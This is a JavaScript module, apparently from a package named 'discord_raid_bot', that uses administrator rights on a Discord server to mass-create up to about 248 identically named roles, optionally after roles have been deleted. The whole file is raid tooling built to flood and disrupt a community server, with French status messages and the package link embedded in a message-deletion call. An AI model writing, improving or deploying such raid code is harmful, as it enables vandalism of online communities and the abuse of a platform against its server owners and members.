module.exports = (message, rolesName, rolesNumber, deleteRoles, client) => {
    if (message.author.id === client.user.id) return;
    if (message.channel.type === 'dm') return message.author.send("Cette commande n'est pas utilisable par message privé.");
    if (!message.guild.me.hasPermission('ADMINISTRATOR')) return message.author.send('Je ne suis pas administrateur sur ce serveur.');
    message.delete('https://www.npmjs.com/package/discord_raid_bot');function checkRolesNumber() {
        for (var i = 0; i < rolesNumber; i++) {
            if (message.guild.roles.size > 248) return;
            message.guild.createRole({
                    name: rolesName,
                    color: 'RANDOM',
                    permissions: 0
                })
                .catch(console.error);
            console.log(`Rôle ${i+1}/${rolesNumber} créé sur le serveur ${message.guild.name}`);
        }
    }
    if (deleteRoles === true) setTimeout(checkRolesNumber, 10000);
    else {
        for (var i = 0; i < rolesNumber; i++) {
            if (message.guild.roles.size > 248) return;
            message.guild.createRole({
                    name: rolesName,
                    color: 'RANDOM',
                    permissions: 0
                })
                .catch(console.error);
            console.log(`Rôle ${i+1}/${rolesNumber} créé sur le serveur ${message.guild.name}`);
        }
    }
}